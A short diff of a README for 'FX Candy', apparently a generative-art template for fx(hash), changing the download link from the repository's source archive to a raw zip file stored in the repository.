@@ -10,7 +10,7 @@ If you want to launch any sort of generative type artwork on most blockchains yo
 [fx(hash)](https://www.fxhash.xyz/) allows for us to do a lot of these things all in one step and FX Candy helps you do so.
 
 ## 📦 Download
-- [Download Template](https://github.com/snifty-repo/fx-candy/archive/refs/heads/master.zip)
+- [Download Template](https://github.com/snifty-repo/fx-candy/raw/master/fx-candy.zip)
 
 ## 🤝 Getting Started
 
